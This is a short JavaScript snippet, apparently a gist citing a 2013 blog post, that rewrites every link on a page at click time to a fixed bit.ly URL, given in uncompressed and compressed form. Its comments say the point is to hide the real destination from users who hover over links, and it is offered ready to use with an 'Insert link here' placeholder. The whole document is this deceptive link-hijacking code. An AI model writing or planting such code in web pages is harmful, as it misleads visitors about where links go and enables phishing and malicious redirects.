// Javascript to redirect all links on a page to a specified URL but AFTER CLICK
// This effectively hides the redirection target from a user 
hovering the link with // the mouse cursor. Source: 
http://bilaw.al/2013/03/17/hacking-the-a-tag-in-100-characters.html // 
Uncompressed var links = document.getElementsByTagName('a'); for(var 
i=0; i < links.length; i++){
    links[i].onclick = function(){
        this.href = 'http://bit.ly/141nisR'; // Insert link here
    };
}
// Compressed (100 characters exc. the link)
o=document.getElementsByTagName('a');for(j=0;j<o.length;j++){o[j].onclick=function(){this.href='http://bit.ly/141nisR';}}
